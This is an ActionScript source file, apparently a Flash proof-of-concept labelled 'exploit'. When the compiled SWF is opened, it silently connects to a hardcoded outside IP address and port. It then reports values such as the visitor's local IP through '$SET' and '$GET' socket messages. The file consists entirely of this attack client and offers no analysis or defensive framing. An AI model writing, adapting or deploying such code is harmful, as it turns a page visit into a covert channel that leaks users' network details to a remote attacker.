//as3compile exploit.as -o exploit.swf
package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	
	public class Main extends MovieClip {
		static var socket:Socket
		var sServer:String="62.213.198.42"
		var iServerPort:int=6000
		var sType:String
		var sCallbackPort:String
		var sCallbackIP:String

      		function Main() {
		        
			socket = new Socket();

			socket.addEventListener(Event.CONNECT, onConnect);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponse);
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);


			socket.connect(sServer, iServerPort);		
		}
		function onConnect(e:Event):void {
			trace("Connected")
			socket.writeUTFBytes("$SET local_ip:ello\n")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			trace("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			trace("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
				trace(data)
			}
		}

		function  setVar(_name:String,_val:String){
			socket.writeUTFBytes("$SET " + _name +":" + _val + '\n')
		}
		function  getVar(_name:String){
			socket.writeUTFBytes("$GET " + _name + '\n')
		}
  
	}
}
